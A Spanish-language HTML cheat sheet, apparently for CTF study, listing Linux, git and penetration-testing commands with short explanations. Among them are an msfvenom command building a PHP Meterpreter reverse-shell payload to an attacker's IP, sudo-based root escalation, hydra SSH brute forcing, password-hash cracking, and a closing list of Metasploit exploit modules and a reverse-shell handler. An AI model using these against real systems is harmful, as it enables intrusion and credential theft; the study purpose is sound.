<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Comandos y Metasploit</title>
  <link rel="icon" href="/images/terminal.png" type="image/png">
  <style>
    :root {
      --brick-fire: #B22222;
      --fondo-negro: #121212;
      --texto-principal: #e0dcdc;
      --texto-secundario: #b5a6a6;
      --gris-oscuro: #2a2a2a;
    }

    body {
      background-color: var(--fondo-negro);
      color: var(--texto-principal);
      font-family: 'Georgia', serif;
      margin: 0;
      padding: 3rem 1rem;
      line-height: 1.9;
      font-size: 1.05rem;
      max-width: 900px;
      margin-left: auto;
      margin-right: auto;
      white-space: pre-wrap;
    }

    h1 {
      color: var(--brick-fire);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-size: 2.5rem;
      margin-bottom: 2rem;
      border-bottom: 3px solid var(--brick-fire);
      padding-bottom: 0.3rem;
    }

    h2 {
      color: var(--brick-fire);
      font-size: 1.5rem;
      margin-top: 2rem;
      border-bottom: 1px dashed var(--brick-fire);
    }

    code {
      background-color: #1f1f1f;
      padding: 0.2rem 0.4rem;
      border-radius: 4px;
      font-family: monospace;
      display: block;
      margin: 0.3rem 0;
      white-space: pre-wrap;
    }

    footer {
      text-align: center;
      color: var(--brick-fire);
      margin-top: 4rem;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
    <h1>Comandos</h1>
    <code>
find / -perm -4000 2>/dev/null [busca en todo el sistema archivos con privilegios elevados]

find / -perm -u=s -type f 2>/dev/null [busca archivos en todo el sistema que tienen el bit setuid activado, lo que significa que cuando se ejecutan lo hacen con los privilegios del propietario]

ltrace ./archivo [muestra en tiempo real las funciones de biblioteca que un programa llama mientras se ejecuta]

nc -zv ip (puerto) [verifica si un puerto está abierto en un host]

nc ip (puerto) {contraseña} [conectar servidor a un puerto en específico]

nc localhost (puerto) {contraseña} [conectar el servidor en el que estás a un puerto en específico]

nc –lnvp (puerto) [creará un servidor de escucha, mostrará información sobre las conexiones y no intentará resolver los nombres de host de quienes se conecten. Estará esperando que alguien le envíe datos a ese puerto]

ncat --ssl (servidor) (puerto) [sirve para crear una conexión más segura y con cifrado]

ncat servidor (puerto) [sirve para crear conexiones de forma mucho más segura]

nmap -p (numpuerto-numpuerto) (ip o página) [para escanear solo entre un rango de puertos de un número a otro]

nmap -p (puerto) (ip) [es una herramienta que escanea redes para encontrar hosts, puertos abiertos y servicios activos]

nmap (página) o (ip) [para ver qué puertos están abiertos en una máquina remota]

nmap -sVC (ip) [es una forma rápida de obtener información detallada sobre los servicios en un host incluidos detalles de versiones y posibles vulnerabilidades]

ping página o ip [se usa para verificar la conectividad de red entre tu máquina y otra dirección]

sudo ed [dentro de ed, al usar el comando !/bin/sh, ejecutamos una shell con permisos de root, lo que nos da control total sobre el sistema. Esto se aprovecha en la escalada de privilegios en un CTF para obtener acceso como administrador]

sudo -l [muestra qué comandos puedes ejecutar con privilegios de superusuario]

sudo bash [permite ejecutar una bash con privilegios de root]

#!/bin/bash [le indica al sistema operativo qué intérprete usar para ejecutar el script]

python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]

ip a [linux] / ipconfig [windows] [averiguar ip de nuestro dispositivo]

ping (ip) [para ver si hay conexión con una ip]

ncat -lvnp (puerto) [sirve para escuchar conexiones entrantes a un puerto, actuando como un servidor a la espera de que un cliente se conecte]

nmap (ip)/24 [escanea todos los hosts en la red para detectar puertos abiertos y servicios activos]

nmap -p (puerto) -sCV (ip) -oN (archivo.txt) [escanea un puerto específico de una ip para detectar servicios, versiones y posibles vulnerabilidades, y guarda el resultado en un archivo de texto]

whatweb (ip) [sirve para identificar tecnologías y servicios usados por un sitio web]

wpscan --url (ip) [es para identificar plugin o cosas vulnerables en un sitio WordPress]

wpscan --url (ip) --enumerate u [sirve para enumerar los usuarios registrados en un sitio wordpress en busca de posibles vectores de ataque como fuerza bruta]

gobuster dir -u http://IP/ -w (RutaDeWordlist) -x html,php,txt,zip -t 100 -k -r [El comando fuerza rutas ocultas en un sitio web usando una wordlist, probando extensiones .html, .php, .txt y .zip con 100 hilos, ignorando certificados y sin seguir redirecciones.]

fuzz 

dirb (ip o url) (RutaDeWordlist) [fuerza rutas ocultas en un sitio web usando una wordlist]

curl -v -X OPTIONS (ip o url) [realiza una solicitud OPTIONS a un sitio web]

curl -T archivo (ip/dir/archivo) --http1.0 [sirve para subir un archivo a un servidor web usando el método HTTP PUT bajo la versión HTTP/1.0]

enum4linux (IP) [enumera usuarios, grupos, recursos compartidos SMB, políticas y más en sistemas Windows/Samba]

zip2john archivo.zip > otroarchivo.zip [extrae el hash de la contraseña del archivo ZIP para que pueda ser crackeado por John the Ripper]

ssh2john archivo > archivo.hash [Convierte el archivo de clave privada SSH en un formato que John the Ripper puede procesar, y guarda la salida en un archivo .hash para usarlo en un ataque de cracking de contraseña]

john --wordlist=(RutaDeWordlist) --pot=contraseñaguardada.pot otroarchivo [usa John the Ripper con una wordlist para descifrar la contraseña del archivo a partir del hash y la guarda con el parámetro pot]

john --format=sha512crypt --wordlist=(RutaDeWordlist) --pot=contraseñasdesifradas.pot contraseñas.hash [usa John the Ripper indicando el formato de encriptación de sha512 para descifrarlas a partir de un hash y guardarlo con el parámetro pot]

hydra -l (usuario) -P (RutaDeWordlist) ssh://IP [realiza un ataque de fuerza bruta al servicio SSH usando el usuario "admin" y la wordlist "rockyou.txt" para intentar encontrar la contraseña]

script /dev/null -c bash [sirve para convertir una shell limitada en una terminal interactiva completa que soporte comandos, flechas y autocompletado]

uname -r [muestra la versión del kernel de Linux que está corriendo en el sistema]

python3 -m http.server (puerto) [levanta un servidor web simple en un puerto para compartir archivos de forma rápida desde el directorio donde lo ejecutás]

wget http://ip:puerto/archivo [usando wget podes traer de una maquina, un archivo desde un servidor http]

gcc -pthread (archivo.c) -o (nombre del archivo a compilar) -lcrypt [compila un programa en C que aprovecha una vulnerabilidad para crear un usuario con permisos de administrador]

rlogin -l root (ip) [intenta iniciar una sesión remota en otro sistema utilizando el usuario root]

searchsploit (nombre del exploit) [busca posibles exploits]

sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip) LPORT=(puerto) -f raw > archivo [este comando crea un archivo PHP malicioso que al abrirse se conecta a tu IP y puerto para darte control remoto del sistema]

msfconsole [inicia metasploit y su consola para pruebas de penetración que permite identificar, explotar y validar vulnerabilidades]

search (modulo) [para buscar cualquier modulo para ejecutar]

use (nombre del modulo) [para usar el modulo]

set rhosts (ip) [para establecer la ip del objetivo]

sessions [muestra el numero de sesiones]

sessions -i (numero de sesion) [selecciona una sesion por el numero]

shell [permite invocar una shell dentro de una sesion de metasploit]

run [para ejecutar el modulo]

exploit [para ejecutar el modulo]

back [para salir del modulo y volver a la consola]

exit [para salir de la consola de metasploit]

getent passw [información de usuarios]

getent shadow [información de contraseñas de usuarios]

getent group [información de grupos]

getent hosts [mapeos de nombres de host a direcciones IP]

getent services [información de servicios de red y sus puertos]

cat ./directorio [para buscar los archivos de texto]

cd .. [te devuelve para atrás]

cd directorio/ [entra a un directorio]

chmod 400 [solo el propietario puede leer el archivo]

chmod 600 [solo el propietario puede leer y escribir el archivo]

chmod 777 [abrir permisos para todos los usuarios, leer, escribir y ejecutar]

chmod +x [da permisos para ejecutar un archivo]

cp /directorio/archivo.txt [copia un archivo a otro directorio]

diff archivo archivo [sirve para comparar dos archivos de texto y mostrar las diferencias, línea por línea entre ellos]

du [muestra el tamaño de los archivos o directorios]

echo "Texto" > archivo.txt [escribe "Texto" en el archivo archivo.txt, sobrescribiendo su contenido si ya existe]

find [para encontrar archivos]

find / [para encontrar todo]

find -group [para encontrar archivos de la propiedad de un grupo]

find -name "archivo" 2>/dev/null [/ indica que busque en la raíz del sistema. -name “archivo” indica busca archivos o carpetas que literal se llamen “archivo”. 2>/dev/null oculta los problemas]

find -user [para encontrar archivos de la propiedad de un usuario]

file archivo [determina qué tipo de archivo es]

ls [muestra todo el contenido del directorio]

ls -la [muestra todos los archivos ocultos]

ls -l [muestra las propiedades de los archivos y permisos]

ls archivo [muestra todo el contenido del directorio]

mkdir archivo [crea un directorio]

mktemp -d [crear un directorio temporal]

mv archivo.txt /directorio [mueve un archivo a otro directorio y cambia nombre de un archivo]

pwd [muestra el directorio en el que estás]

rm archivo.txt [borra un archivo]

touch archivo.txt [crea un archivo si no existe y si existe cambia la fecha de modificación]

vim archivo.txt [edita un archivo]

vim (:q [para salir, :q! para forzarlo y para guardar w:)]

:v [Activa el modo visual en Vim para seleccionar texto]

:shell [Abre una shell dentro de Vim para ejecutar comandos sin salir del editor]

:set shell=/bin/bash [Configura Bash como el shell predeterminado para ejecutar comandos del sistema dentro de Vim]

bzip2 archivo.txt [comprime genera archivo.txt.bz2]

bunzip2 archivo.txt.bz2 [descomprime recupera archivo.txt]

gzip archivo.txt [comprime archivo.txt genera archivo.txt.gz]

gunzip archivo.txt.gz [descomprime archivo.txt.gz recupera archivo.txt]

tar -cf archivo.tar carpeta/ [crea un archivo .tar empaquetando una carpeta]

tar -xf archivo.tar [extrae el contenido del archivo .tar]

xxd archivo.txt [transforma binario a hexadecimal]

xxd -r archivo.txt [transforma hexadecimal a binario]

ping página o ip [se usa para verificar la conectividad de red entre tu máquina y otra dirección]

ssh usuario@servidor -p puerto [iniciar sesión]

ssh -i /ruta/a/tu/clave_privada user@hostname [para conectarte a un servidor remoto usando tu clave privada SSH]

ssh usuario@servidor -p puerto “comando” [inicia sesión y ejecuta un comando sin quedarse conectado]

ssh-keygen [para generar una clave]

ssh-keygen -lf [sirve para mostrar la huella digital de una clave SSH pública]

ssh-keygen -t ed25519 -C "tu_email@example.com" [para generar una clave ssh con un mail]

cat ~/.ssh/clave.pub [para leer la clave ssh]

ssh -T git@github.com [probar conexion en git con ssh para autenticar]

systemctl enable ssh [iniciar ssh]

openssl s_client -connect gugul.com:puerto [para trabajar con protocolos de seguridad, certificados, y cifrado, también puede realizar pruebas de SSL/TLS]

openssl s_client -connect localhost:puerto [para conectarse estando dentro del servidor en un puerto específico]

ftp (ip) [es un protocolo de transferencia de archivos que permite a los usuarios subir y descargar archivos de manera remota entre computadoras a través de una red]

base64 [codificar base64]

base64 -d archivo < archivo1 [decodificar base 64]

echo “palabra” | base64 [codificar base64]

grep [para encontrar líneas de texto]

ROT13 [usa las letras en el orden alfabético N-Z y A-M]

sort [ordena las líneas alfabéticamente]

strings [sirve para buscar texto legible]

tr -d [traducir o eliminar líneas de texto]

tr ‘a-z’ ‘A-Z’ [transforma minúsculas a mayúsculas]

uniq -u [filtra líneas idénticas y -u elimina las repetidas]

| [separa para colocar otro comando en la misma línea]

git init [Inicializa un nuevo repositorio Git]

git clone <url> [Clona un repositorio remoto]

git status [Muestra el estado actual del repositorio]

git add <archivo> [Agrega archivos al área de preparación]

git commit -m "mensaje" [Realiza un commit con los cambios]

git log [Muestra el historial de commits]

git diff [Muestra las diferencias entre el último commit y los cambios]

git pull [Obtiene y fusiona cambios del repositorio remoto]

git push [Envía commits locales al repositorio remoto]

git branch [Muestra las ramas del repositorio]

git branch –a [Muestra todas las ramas locales y remotas]

git checkout <rama> [Cambia a la rama especificada]

git merge <rama> [Fusiona la rama especificada con la rama actual]

git remote -v [Muestra las URLs de los repositorios remotos]

git fetch [Obtiene los cambios de un repositorio remoto sin fusionarlos]

git reset --hard <commit> [Restablece el repositorio a un commit específico, eliminando cambios]

git rebase <rama> [Aplica cambios de una rama a otra reescribiendo el historial]

git cherry-pick <commit> [Aplica un commit específico de otra rama a la rama actual]

git stash [Guarda cambios temporales para poder cambiar de rama]

git stash pop [Recupera los cambios guardados con git stash]

git tag <nombre> [Crea una etiqueta en un commit específico]

git rebase -i <commit> [Realiza un rebase interactivo para reordenar y modificar commits]

git reflog [Muestra el historial de los movimientos de HEAD]

git clean -fd [Elimina archivos no rastreados en el directorio de trabajo]

git blame <archivo> [Muestra quién modificó cada línea de un archivo]

git bisect [Encuentra el commit que introdujo un error mediante búsqueda binaria]

git submodule [Gestiona submódulos Git, es decir, repositorios dentro de otros repositorios]

git config --global user.name "Tu Nombre" [Configura el nombre de usuario global]

git config --global user.email "tu.email@dominio.com" [Configura el correo electrónico global]

git branch <nombre-rama> [Crea una nueva rama]

git checkout -b <nombre-rama> [Crea y cambia a una nueva rama]

git branch -d <nombre-rama> [Elimina una rama que ya ha sido fusionada]

git merge <rama> [Fusiona una rama en la rama actual]

git tag <nombre_del_tag> [Crea un tag ligero en el commit actual]

git tag -a <nombre_del_tag> -m "mensaje" [Crea un tag anotado con un mensaje descriptivo en el commit actual]

git tag [Lista todos los tags en tu repositorio local]

git tag -l "patron*" [Lista tags que coinciden con un patrón específico, por ejemplo, v* para tags que empiezan con 'v']

git show <nombre_del_tag> [Muestra los detalles y el mensaje de un tag específico]

git push origin <nombre_del_tag> [Sube un tag específico a tu repositorio remoto]

git push origin --tags [Sube todos tus tags locales a tu repositorio remoto]

<<< [Sirve para proporcionar una cadena de texto directamente como entrada estándar a un comando]

& [Sirve para ejecutar comandos en segundo plano que son de larga duración como nc para conexiones largas, find para buscar en un directorio grande, cp para copiar archivos grandes]

jobs [ver procesos en segundo plano]
    </code>

  <h1>Payloads Metasploit</h1>
       
    <code>
exploit/unix/webapp/wp_admin_shell_upload [WordPress Admin Shell Upload]

exploit/unix/ftp/proftpd_133c_backdoor [ProFTPD-1.3.3c Backdoor Command Execution]

auxiliary/admin/http/wp_google_maps_sqli [WordPress Google Maps Plugin SQL Injection]

exploit/multi/handler [Generic Payload Handler] {

  payload/php/meterpreter_reverse_tcp

}

    </code>